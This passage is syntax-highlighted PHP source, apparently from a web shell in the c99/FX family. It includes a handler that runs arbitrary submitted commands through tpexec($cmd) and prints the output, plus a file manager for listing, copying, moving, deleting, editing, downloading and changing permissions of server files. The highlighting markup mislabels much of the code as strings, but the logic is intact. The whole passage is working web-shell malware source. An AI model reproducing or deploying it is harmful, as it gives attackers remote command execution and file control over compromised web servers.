          <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span><span class="nv">$ret</span><span class="p">))</span> <span class="p">{</span><span class="nx">fs_rmobj</span><span class="p">(</span><span class="nv">$v</span><span class="p">);}</span>
          <span class="nb">unset</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]);</span>
        <span class="p">}</span>
        <span class="nx">tp_sess_put</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$arcerr</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Archivation errors:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$arcerr</span><span class="p">;}</span>
        <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nv">$actpastebuff</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$psterr</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
        <span class="k">foreach</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
          <span class="nv">$to</span> <span class="o">=</span> <span class="nv">$d</span><span class="o">.</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">fs_copy_obj</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span><span class="nv">$d</span><span class="p">))</span> <span class="p">{</span><span class="nv">$psterr</span> <span class="o">.=</span> <span class="s2">&quot;Can&#39;t copy &quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot; to &quot;</span><span class="o">.</span><span class="nv">$to</span><span class="o">.</span><span class="s2">&quot;!&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
          <span class="k">if</span> <span class="p">(</span><span class="nv">$copy_unset</span><span class="p">)</span> <span class="p">{</span><span class="nb">unset</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]);}</span>
        <span class="p">}</span>
        <span class="k">foreach</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
          <span class="nv">$to</span> <span class="o">=</span> <span class="nv">$d</span><span class="o">.</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">fs_move_obj</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span><span class="nv">$d</span><span class="p">))</span> <span class="p">{</span><span class="nv">$psterr</span> <span class="o">.=</span> <span class="s2">&quot;Can&#39;t move &quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot; to &quot;</span><span class="o">.</span><span class="nv">$to</span><span class="o">.</span><span class="s2">&quot;!&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
          <span class="nb">unset</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]);</span>
        <span class="p">}</span>
        <span class="nx">tp_sess_put</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$psterr</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Error pasting:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$psterr</span><span class="p">;}</span>
        <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;cmd&quot;</span><span class="p">)</span> <span class="p">{</span>
      <span class="o">@</span><span class="nb">chdir</span><span class="p">(</span><span class="nv">$chdir</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$submit</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;div class=barheader&amp;gt;.: Results of Execution :.&amp;lt;/div&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
        <span class="nv">$olddir</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">);</span>
        <span class="o">@</span><span class="nb">chdir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
        <span class="nv">$ret</span> <span class="o">=</span> <span class="nx">tpexec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
        <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">convert_cyr_string</span><span class="p">(</span><span class="nv">$ret</span><span class="p">,</span><span class="s2">&quot;d&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$cmd_txt</span><span class="p">)</span> <span class="p">{</span>
          <span class="nv">$rows</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">))</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span>
          <span class="k">if</span> <span class="p">(</span><span class="nv">$rows</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$rows</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="nv">$rows</span> <span class="o">=</span> <span class="mi">30</span><span class="p">;</span> <span class="p">}</span>
          <span class="nv">$cols</span> <span class="o">=</span> <span class="mi">130</span><span class="p">;</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;textarea class=shell cols=</span><span class="se">\&quot;</span><span class="si">$cols\</span><span class="s2">&quot;</span> <span class="nx">rows</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;</span><span class="si">$rows\</span><span class="s2">&quot;</span> <span class="nx">readonly</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;.htmlspecialchars(</span><span class="si">$ret</span><span class="s2">).&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">textarea</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">\n</span><span class="s2">&quot;;</span>
<span class="s2">          //echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">div</span> <span class="nx">align</span><span class="o">=</span><span class="nx">left</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">pre</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;.htmlspecialchars(</span><span class="si">$ret</span><span class="s2">).&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">pre</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">div</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">        }</span>
<span class="s2">        else { echo </span><span class="si">$ret</span><span class="s2">.&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;; }</span>
<span class="s2">        @chdir(</span><span class="si">$olddir</span><span class="s2">);</span>
<span class="s2">      }</span>
<span class="s2">    }</span>
<span class="s2">    if (</span><span class="si">$act</span><span class="s2"> == &quot;</span><span class="nx">ls</span><span class="s2">&quot;) {</span>
<span class="s2">      if (count(</span><span class="si">$ls_arr</span><span class="s2">) &amp;gt; 0) { </span><span class="si">$list</span><span class="s2"> = </span><span class="si">$ls_arr</span><span class="s2">; }</span>
<span class="s2">      else {</span>
<span class="s2">        </span><span class="si">$list</span><span class="s2"> = array();</span>
<span class="s2">        if (</span><span class="si">$h</span><span class="s2"> = @opendir(</span><span class="si">$d</span><span class="s2">)) {</span>
<span class="s2">          while ((</span><span class="si">$o</span><span class="s2"> = readdir(</span><span class="si">$h</span><span class="s2">)) !== FALSE) </span><span class="si">{</span><span class="nv">$list</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$d</span><span class="o">.</span><span class="nv">$o</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2">          closedir(</span><span class="si">$h</span><span class="s2">);</span>
<span class="s2">        }</span>
<span class="s2">      }</span>
<span class="s2">      if (count(</span><span class="si">$list</span><span class="s2">) == 0) { echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">div</span> <span class="nx">class</span><span class="o">=</span><span class="nx">fxerrmsg</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Can</span><span class="s1">&#39;t open folder (&quot;.htmlspecialchars($d).&quot;)!&amp;lt;/div&amp;gt;&quot;;}</span>
<span class="s1">      else {</span>
<span class="s1">        $objects = array();</span>
<span class="s1">        $vd = &quot;f&quot;; //Viewing mode</span>
<span class="s1">        if ($vd == &quot;f&quot;) {</span>
<span class="s1">          $objects[&quot;head&quot;] = array();</span>
<span class="s1">          $objects[&quot;folders&quot;] = array();</span>
<span class="s1">          $objects[&quot;links&quot;] = array();</span>
<span class="s1">          $objects[&quot;files&quot;] = array();</span>
<span class="s1">          foreach ($list as $v) {</span>
<span class="s1">            $o = basename($v);</span>
<span class="s1">            $row = array();</span>
<span class="s1">            if ($o == &quot;.&quot;) {$row[] = $d.$o; $row[] = &quot;CURDIR&quot;;}</span>
<span class="s1">            elseif ($o == &quot;..&quot;) {$row[] = $d.$o; $row[] = &quot;UPDIR&quot;;}</span>
<span class="s1">            elseif (is_dir($v)) {</span>
<span class="s1">              if (is_link($v)) {$type = &quot;LINK&quot;;}</span>
<span class="s1">              else {$type = &quot;DIR&quot;;}</span>
<span class="s1">              $row[] = $v;</span>
<span class="s1">              $row[] = $type;</span>
<span class="s1">            }</span>
<span class="s1">            elseif(is_file($v)) {$row[] = $v; $row[] = filesize($v);}</span>
<span class="s1">            $row[] = filemtime($v);</span>
<span class="s1">            if (!$win) {</span>
<span class="s1">              $ow = posix_getpwuid(fileowner($v));</span>
<span class="s1">              $gr = posix_getgrgid(filegroup($v));</span>
<span class="s1">              $row[] = ($ow[&quot;name&quot;]?$ow[&quot;name&quot;]:fileowner($v)).&quot;/&quot;.($gr[&quot;name&quot;]?$gr[&quot;name&quot;]:filegroup($v));</span>
<span class="s1">            }</span>
<span class="s1">            $row[] = fileperms($v);</span>
<span class="s1">            if (($o == &quot;.&quot;) or ($o == &quot;..&quot;)) {$objects[&quot;head&quot;][] = $row;}</span>
<span class="s1">            elseif (is_link($v)) {$objects[&quot;links&quot;][] = $row;}</span>
<span class="s1">            elseif (is_dir($v)) {$objects[&quot;folders&quot;][] = $row;}</span>
<span class="s1">            elseif (is_file($v)) {$objects[&quot;files&quot;][] = $row;}</span>
<span class="s1">            $i++;</span>
<span class="s1">          }</span>
<span class="s1">          $row = array();</span>
<span class="s1">          $row[] = &quot;&amp;lt;b&amp;gt;Name&amp;lt;/b&amp;gt;&quot;;</span>
<span class="s1">          $row[] = &quot;&amp;lt;b&amp;gt;Size&amp;lt;/b&amp;gt;&quot;;</span>
<span class="s1">          $row[] = &quot;&amp;lt;b&amp;gt;Date Modified&amp;lt;/b&amp;gt;&quot;;</span>
<span class="s1">          if (!$win) {$row[] = &quot;&amp;lt;b&amp;gt;Owner/Group&amp;lt;/b&amp;gt;&quot;;}</span>
<span class="s1">          $row[] = &quot;&amp;lt;b&amp;gt;Perms&amp;lt;/b&amp;gt;&quot;;</span>
<span class="s1">          $row[] = &quot;&amp;lt;b&amp;gt;Action&amp;lt;/b&amp;gt;&quot;;</span>
<span class="s1">          $parsesort = parsesort($sort);</span>
<span class="s1">          $sort = $parsesort[0].$parsesort[1];</span>
<span class="s1">          $k = $parsesort[0];</span>
<span class="s1">          if ($parsesort[1] != &quot;a&quot;) {$parsesort[1] = &quot;d&quot;;}</span>
<span class="s1">          $y = &quot; &amp;lt;a href=\&quot;&quot;.$surl.&quot;act=&quot;.$dspact.&quot;&amp;d=&quot;.urlencode($d).&quot;&amp;sort=&quot;.$k.($parsesort[1] == &quot;a&quot;?&quot;d&quot;:&quot;a&quot;).&quot;\&quot;&amp;gt;&quot;;</span>
<span class="s1">          $y .= &quot;&amp;lt;img src=\&quot;&quot;.$surl.&quot;act=img&amp;img=sort_&quot;.($sort[1] == &quot;a&quot;?&quot;asc&quot;:&quot;desc&quot;).&quot;\&quot; height=\&quot;9\&quot; width=\&quot;14\&quot; alt=\&quot;&quot;.($parsesort[1] == &quot;a&quot;?&quot;Asc.&quot;:&quot;Desc&quot;).&quot;\&quot; border=\&quot;0\&quot;&amp;gt;&amp;lt;/a&amp;gt;&quot;;</span>
<span class="s1">          $row[$k] .= $y;</span>
<span class="s1">          for($i=0;$i&amp;lt;count($row)-1;$i++) {</span>
<span class="s1">            if ($i != $k) {$row[$i] = &quot;&amp;lt;a href=\&quot;&quot;.$surl.&quot;act=&quot;.$dspact.&quot;&amp;d=&quot;.urlencode($d).&quot;&amp;sort=&quot;.$i.$parsesort[1].&quot;\&quot;&amp;gt;&quot;.$row[$i].&quot;&amp;lt;/a&amp;gt;&quot;;}</span>
<span class="s1">          }</span>
<span class="s1">          $v = $parsesort[0];</span>
<span class="s1">          usort($objects[&quot;folders&quot;], &quot;tabsort&quot;);</span>
<span class="s1">          usort($objects[&quot;links&quot;], &quot;tabsort&quot;);</span>
<span class="s1">          usort($objects[&quot;files&quot;], &quot;tabsort&quot;);</span>
<span class="s1">          if ($parsesort[1] == &quot;d&quot;) {</span>
<span class="s1">            $objects[&quot;folders&quot;] = array_reverse($objects[&quot;folders&quot;]);</span>
<span class="s1">            $objects[&quot;files&quot;] = array_reverse($objects[&quot;files&quot;]);</span>
<span class="s1">          }</span>
<span class="s1">          $objects = array_merge($objects[&quot;head&quot;],$objects[&quot;folders&quot;],$objects[&quot;links&quot;],$objects[&quot;files&quot;]);</span>
<span class="s1">          $tab = array();</span>
<span class="s1">          $tab[&quot;cols&quot;] = array($row);</span>
<span class="s1">          $tab[&quot;head&quot;] = array();</span>
<span class="s1">          $tab[&quot;folders&quot;] = array();</span>
<span class="s1">          $tab[&quot;links&quot;] = array();</span>
<span class="s1">          $tab[&quot;files&quot;] = array();</span>
<span class="s1">          $i = 0;</span>
<span class="s1">          foreach ($objects as $a) {</span>
<span class="s1">            $v = $a[0];</span>
<span class="s1">            $o = basename($v);</span>
<span class="s1">            $dir = dirname($v);</span>
<span class="s1">            if ($disp_fullpath) {$disppath = $v;}</span>
<span class="s1">            else {$disppath = $o;}</span>
<span class="s1">            $disppath = str2mini($disppath,60);</span>
<span class="s1">            if (in_array($v,$sess_data[&quot;cut&quot;])) {$disppath = &quot;&amp;lt;strike&amp;gt;&quot;.$disppath.&quot;&amp;lt;/strike&amp;gt;&quot;;}</span>
<span class="s1">            elseif (in_array($v,$sess_data[&quot;copy&quot;])) {$disppath = &quot;&amp;lt;u&amp;gt;&quot;.$disppath.&quot;&amp;lt;/u&amp;gt;&quot;;}</span>
<span class="s1">            foreach ($regxp_highlight as $r) {</span>
<span class="s1">              if (ereg($r[0],$o)) {</span>
<span class="s1">                if ((!is_numeric($r[1])) or ($r[1] &amp;gt; 3)) {$r[1] = 0; ob_clean(); echo &quot;Warning! Configuration error in \$regxp_highlight[&quot;.$k.&quot;][0] - unknown command.&quot;; tpshexit();}</span>
<span class="s1">                else {</span>
<span class="s1">                  $r[1] = round($r[1]);</span>
<span class="s1">                  $isdir = is_dir($v);</span>
<span class="s1">                  if (($r[1] == 0) or (($r[1] == 1) and !$isdir) or (($r[1] == 2) and !$isdir)) {</span>
<span class="s1">                    if (empty($r[2])) {$r[2] = &quot;&amp;lt;b&amp;gt;&quot;; $r[3] = &quot;&amp;lt;/b&amp;gt;&quot;;}</span>
<span class="s1">                    $disppath = $r[2].$disppath.$r[3];</span>
<span class="s1">                    if ($r[4]) {break;}</span>
<span class="s1">                  }</span>
<span class="s1">                }</span>
<span class="s1">              }</span>
<span class="s1">            }</span>
<span class="s1">            $uo = urlencode($o);</span>
<span class="s1">            $ud = urlencode($dir);</span>
<span class="s1">            $uv = urlencode($v);</span>
<span class="s1">            $row = array();</span>
<span class="s1">            if ($o == &quot;.&quot;) {</span>
<span class="s1">              $row[] = &quot;&amp;lt;a href=\&quot;&quot;.$surl.&quot;act=&quot;.$dspact.&quot;&amp;d=&quot;.urlencode(realpath($d.$o)).&quot;&amp;sort=&quot;.$sort.&quot;\&quot;&amp;gt;&amp;lt;img src=\&quot;&quot;.$surl.&quot;act=img&amp;img=small_dir\&quot; border=\&quot;0\&quot;&amp;gt;&amp;nbsp;&quot;.$o.&quot;&amp;lt;/a&amp;gt;&quot;;</span>
<span class="s1">              $row[] = &quot;CURDIR&quot;;</span>
<span class="s1">            }</span>
<span class="s1">            elseif ($o == &quot;..&quot;) {</span>
<span class="s1">              $row[] = &quot;&amp;lt;a href=\&quot;&quot;.$surl.&quot;act=&quot;.$dspact.&quot;&amp;d=&quot;.urlencode(realpath($d.$o)).&quot;&amp;sort=&quot;.$sort.&quot;\&quot;&amp;gt;&amp;lt;img src=\&quot;&quot;.$surl.&quot;act=img&amp;img=ext_lnk\&quot; border=\&quot;0\&quot;&amp;gt;&amp;nbsp;&quot;.$o.&quot;&amp;lt;/a&amp;gt;&quot;;</span>
<span class="s1">              $row[] = &quot;UPDIR&quot;;</span>
<span class="s1">            }</span>
<span class="s1">            elseif (is_dir($v)) {</span>
<span class="s1">              if (is_link($v)) {</span>
<span class="s1">                $disppath .= &quot; =&amp;gt; &quot;.readlink($v);</span>
<span class="s1">                $type = &quot;LINK&quot;;</span>
<span class="s1">                $row[] = &quot;&amp;lt;a href=\&quot;&quot;.$surl.&quot;act=ls&amp;d=&quot;.$uv.&quot;&amp;sort=&quot;.$sort.&quot;\&quot;&amp;gt;&amp;lt;img src=\&quot;&quot;.$surl.&quot;act=img&amp;img=ext_lnk\&quot; border=\&quot;0\&quot;&amp;gt;&amp;nbsp;[&quot;.$disppath.&quot;]&amp;lt;/a&amp;gt;&quot;;</span>
<span class="s1">              }</span>
<span class="s1">              else {</span>
<span class="s1">                $type = &quot;DIR&quot;;</span>
<span class="s1">                $row[] =  &quot;&amp;lt;a href=\&quot;&quot;.$surl.&quot;act=ls&amp;d=&quot;.$uv.&quot;&amp;sort=&quot;.$sort.&quot;\&quot;&amp;gt;&amp;lt;img src=\&quot;&quot;.$surl.&quot;act=img&amp;img=small_dir\&quot; border=\&quot;0\&quot;&amp;gt;&amp;nbsp;[&quot;.$disppath.&quot;]&amp;lt;/a&amp;gt;&quot;;</span>
<span class="s1">              }</span>
<span class="s1">              $row[] = $type;</span>
<span class="s1">            }</span>
<span class="s1">            elseif(is_file($v)) {</span>
<span class="s1">              $ext = explode(&quot;.&quot;,$o);</span>
<span class="s1">              $c = count($ext)-1;</span>
<span class="s1">              $ext = $ext[$c];</span>
<span class="s1">              $ext = strtolower($ext);</span>
<span class="s1">              $row[] =  &quot;&amp;lt;a href=\&quot;&quot;.$surl.&quot;act=f&amp;f=&quot;.$uo.&quot;&amp;d=&quot;.$ud.&quot;\&quot;&amp;gt;&amp;lt;img src=\&quot;&quot;.$surl.&quot;act=img&amp;img=ext_&quot;.$ext.&quot;\&quot; border=\&quot;0\&quot;&amp;gt;&amp;nbsp;&quot;.$disppath.&quot;&amp;lt;/a&amp;gt;&quot;;</span>
<span class="s1">              $row[] = view_size($a[1]);</span>
<span class="s1">            }</span>
<span class="s1">            $row[] = @date(&quot;d.m.Y H:i:s&quot;,$a[2]);</span>
<span class="s1">            if (!$win) { $row[] = $a[3]; }</span>
<span class="s1">            $row[] = &quot;&amp;lt;a href=\&quot;&quot;.$surl.&quot;act=chmod&amp;f=&quot;.$uo.&quot;&amp;d=&quot;.$ud.&quot;\&quot;&amp;gt;&amp;lt;b&amp;gt;&quot;.view_perms_color($v).&quot;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&quot;;</span>
<span class="s1">            if ($o == &quot;.&quot;) {$checkbox = &quot;&amp;lt;input type=\&quot;checkbox\&quot; name=\&quot;actbox[]\&quot; onclick=\&quot;ls_reverse_all();\&quot;&amp;gt;&quot;; $i--;}</span>
<span class="s1">            else {$checkbox = &quot;&amp;lt;input type=\&quot;checkbox\&quot; name=\&quot;actbox[]\&quot; id=\&quot;actbox&quot;.$i.&quot;\&quot; value=\&quot;&quot;.htmlspecialchars($v).&quot;\&quot;&amp;gt;&quot;;}</span>
<span class="s1">            if (is_dir($v)) {$row[] = &quot;&amp;lt;a href=\&quot;&quot;.$surl.&quot;act=d&amp;d=&quot;.$uv.&quot;\&quot;&amp;gt;&amp;lt;img src=\&quot;&quot;.$surl.&quot;act=img&amp;img=ext_diz\&quot; alt=\&quot;Info\&quot; border=\&quot;0\&quot;&amp;gt;&amp;lt;/a&amp;gt;&amp;nbsp;&quot;.$checkbox;}</span>
<span class="s1">            else {$row[] = &quot;&amp;lt;a href=\&quot;&quot;.$surl.&quot;act=f&amp;f=&quot;.$uo.&quot;&amp;ft=info&amp;d=&quot;.$ud.&quot;\&quot;&amp;gt;&amp;lt;img src=\&quot;&quot;.$surl.&quot;act=img&amp;img=ext_diz\&quot; alt=\&quot;Info\&quot; height=\&quot;16\&quot; width=\&quot;16\&quot; border=\&quot;0\&quot;&amp;gt;&amp;lt;/a&amp;gt;&amp;nbsp;&amp;lt;a href=\&quot;&quot;.$surl.&quot;act=f&amp;f=&quot;.$uo.&quot;&amp;ft=edit&amp;d=&quot;.$ud.&quot;\&quot;&amp;gt;&amp;lt;img src=\&quot;&quot;.$surl.&quot;act=img&amp;img=change\&quot; alt=\&quot;Edit\&quot; height=\&quot;16\&quot; width=\&quot;19\&quot; border=\&quot;0\&quot;&amp;gt;&amp;lt;/a&amp;gt;&amp;nbsp;&amp;lt;a href=\&quot;&quot;.$surl.&quot;act=f&amp;f=&quot;.$uo.&quot;&amp;ft=download&amp;d=&quot;.$ud.&quot;\&quot;&amp;gt;&amp;lt;img src=\&quot;&quot;.$surl.&quot;act=img&amp;img=download\&quot; alt=\&quot;Download\&quot; border=\&quot;0\&quot;&amp;gt;&amp;lt;/a&amp;gt;&amp;nbsp;&quot;.$checkbox;}</span>
<span class="s1">            if (($o == &quot;.&quot;) or ($o == &quot;..&quot;)) {$tab[&quot;head&quot;][] = $row;}</span>
<span class="s1">            elseif (is_link($v)) {$tab[&quot;links&quot;][] = $row;}</span>
<span class="s1">            elseif (is_dir($v)) {$tab[&quot;folders&quot;][] = $row;}</span>
<span class="s1">            elseif (is_file($v)) {$tab[&quot;files&quot;][] = $row;}</span>
<span class="s1">            $i++;</span>
<span class="s1">          }</span>
<span class="s1">        }</span>
<span class="s1">        // Compiling table</span>
<span class="s1">        $table = array_merge($tab[&quot;cols&quot;],$tab[&quot;head&quot;],$tab[&quot;folders&quot;],$tab[&quot;links&quot;],$tab[&quot;files&quot;]);</span>
<span class="s1">        echo &quot;&amp;lt;div class=barheader&amp;gt;.: &quot;;</span>
<span class="s1">        if (!empty($fx_infohead)) { echo $fx_infohead; }</span>
<span class="s1">        else { echo &quot;Directory List (&quot;.count($tab[&quot;files&quot;]).&quot; files and &quot;.(count($tab[&quot;folders&quot;])+count($tab[&quot;links&quot;])).&quot; folders)&quot;; }</span>
<span class="s1">        echo &quot; :.&amp;lt;/div&amp;gt;\n&quot;;</span>
<span class="s1">        echo &quot;&amp;lt;form action=\&quot;&quot;.$surl.&quot;\&quot; method=POST name=\&quot;ls_form\&quot;&amp;gt;&amp;lt;input type=hidden name=act value=\&quot;&quot;.$dspact.&quot;\&quot;&amp;gt;&amp;lt;input type=hidden name=d value=&quot;.$d.&quot;&amp;gt;&quot;.</span>
<span class="s1">             &quot;&amp;lt;table class=explorer&amp;gt;&quot;;</span>
<span class="s1">        foreach($table as $row) {</span>
<span class="s1">          echo &quot;&amp;lt;tr&amp;gt;&quot;;</span>
<span class="s1">          foreach($row as $v) {echo &quot;&amp;lt;td&amp;gt;&quot;.$v.&quot;&amp;lt;/td&amp;gt;&quot;;}</span>
<span class="s1">          echo &quot;&amp;lt;/tr&amp;gt;\r\n&quot;;</span>
<span class="s1">        }</span>
<span class="s1">        echo &quot;&amp;lt;/table&amp;gt;&quot;.</span>
<span class="s1">             &quot;&amp;lt;script&amp;gt;&quot;.</span>
<span class="s1">             &quot;function ls_setcheckboxall(status) {&quot;.</span>
<span class="s1">             &quot; var id = 1; var num = &quot;.(count($table)-2).&quot;;&quot;.</span>
<span class="s1">             &quot; while (id &amp;lt;= num) { document.getElementById(&#39;</span><span class="nx">actbox</span><span class="s1">&#39;+id).checked = status; id++; }&quot;.</span>
<span class="s1">             &quot;}&quot;.</span>
<span class="s1">             &quot;function ls_reverse_all() {&quot;.</span>
<span class="s1">             &quot; var id = 1; var num = &quot;.(count($table)-2).&quot;;&quot;.</span>
<span class="s1">             &quot; while (id &amp;lt;= num) { document.getElementById(&#39;</span><span class="nx">actbox</span><span class="s1">&#39;+id).checked = !document.getElementById(&#39;</span><span class="nx">actbox</span><span class="s1">&#39;+id).checked; id++; }&quot;.</span>
<span class="s1">             &quot;}&quot;.</span>
<span class="s1">             &quot;&amp;lt;/script&amp;gt;&quot;.</span>
<span class="s1">             &quot;&amp;lt;div align=\&quot;right\&quot;&amp;gt;&quot;.</span>
<span class="s1">             &quot;&amp;lt;input type=\&quot;button\&quot; onclick=\&quot;ls_setcheckboxall(true);\&quot; value=\&quot;Select all\&quot;&amp;gt;&amp;nbsp;&amp;nbsp;&amp;lt;input type=\&quot;button\&quot; onclick=\&quot;ls_setcheckboxall(false);\&quot; value=\&quot;Unselect all\&quot;&amp;gt;&quot;.</span>
<span class="s1">             &quot;&amp;lt;img src=\&quot;&quot;.$surl.&quot;act=img&amp;img=arrow_ltr\&quot; border=\&quot;0\&quot;&amp;gt;&quot;;</span>
<span class="s1">        if (count(array_merge($sess_data[&quot;copy&quot;],$sess_data[&quot;cut&quot;])) &amp;gt; 0 and ($usefsbuff)) {</span>
<span class="s1">          echo &quot;&amp;lt;input type=submit name=actarcbuff value=\&quot;Pack buffer to archive\&quot;&amp;gt;&amp;nbsp;&amp;lt;input type=\&quot;text\&quot; name=\&quot;actarcbuff_path\&quot; value=\&quot;fx_archive_&quot;.substr(md5(rand(1,1000).rand(1,1000)),0,5).&quot;.tar.gz\&quot;&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;lt;input type=submit name=\&quot;actpastebuff\&quot; value=\&quot;Paste\&quot;&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;lt;input type=submit name=\&quot;actemptybuff\&quot; value=\&quot;Empty buffer\&quot;&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;;</span>
<span class="s1">        }</span>
<span class="s1">        echo &quot;&amp;lt;select name=act&amp;gt;&amp;lt;option value=\&quot;&quot;.$act.&quot;\&quot;&amp;gt;With selected:&amp;lt;/option&amp;gt;&quot;;</span>
<span class="s1">        echo &quot;&amp;lt;option value=delete&quot;.($dspact == &quot;delete&quot;?&quot; selected&quot;:&quot;&quot;).&quot;&amp;gt;Delete&amp;lt;/option&amp;gt;&quot;;</span>
<span class="s1">        echo &quot;&amp;lt;option value=chmod&quot;.($dspact == &quot;chmod&quot;?&quot; selected&quot;:&quot;&quot;).&quot;&amp;gt;Change-mode&amp;lt;/option&amp;gt;&quot;;</span>
<span class="s1">        if ($usefsbuff) {</span>
<span class="s1">          echo &quot;&amp;lt;option value=cut&quot;.($dspact == &quot;cut&quot;?&quot; selected&quot;:&quot;&quot;).&quot;&amp;gt;Cut&amp;lt;/option&amp;gt;&quot;;</span>
<span class="s1">          echo &quot;&amp;lt;option value=copy&quot;.($dspact == &quot;copy&quot;?&quot; selected&quot;:&quot;&quot;).&quot;&amp;gt;Copy&amp;lt;/option&amp;gt;&quot;;</span>
<span class="s1">          echo &quot;&amp;lt;option value=unselect&quot;.($dspact == &quot;unselect&quot;?&quot; selected&quot;:&quot;&quot;).&quot;&amp;gt;Unselect&amp;lt;/option&amp;gt;&quot;;</span>
<span class="s1">        }</span>
